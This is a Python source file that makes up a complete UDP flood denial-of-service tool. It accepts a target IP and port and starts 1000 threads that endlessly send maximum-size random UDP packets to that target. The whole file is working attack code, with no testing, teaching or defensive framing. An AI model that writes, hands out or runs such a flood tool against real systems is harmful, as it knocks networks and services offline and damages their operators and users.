import socket
import random
import argparse
import threading
import os

def create_parser():
    parser = argparse.ArgumentParser(description="UDP Flood Script")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, required=True, help="Target UDP port")
    return parser

def validate_args(args):
    if args.port < 1 or args.port > 65535:
        raise ValueError("Port must be between 1 and 65535")

def generate_payloads(num_payloads, payload_size):
    payloads = [random._urandom(payload_size) for _ in range(num_payloads)]
    return payloads

def udp_flood(target_ip, target_port, thread_id, payloads):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Disable socket buffering for maximum performance
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 0)

    try:
        while True:
            for payload in payloads:
                sock.sendto(payload, (target_ip, target_port))
    except KeyboardInterrupt:
        print(f"Thread {thread_id}: Attack stopped by user.")
    finally:
        sock.close()

def start_flood(target_ip, target_port):
    num_threads = 1000  # Use a large number of threads
    payload_size = 65507  # Maximum UDP payload size
    num_payloads = 1000  # Number of payloads to pre-allocate in RAM

    # Pre-allocate payloads in RAM
    payloads = generate_payloads(num_payloads, payload_size)

    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, i, payloads))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def main():
    parser = create_parser()
    args = parser.parse_args()

    try:
        validate_args(args)
        start_flood(args.target, args.port)
    except ValueError as e:
        print(f"Error: {e}")
        parser.print_help()

if __name__ == "__main__":
    main()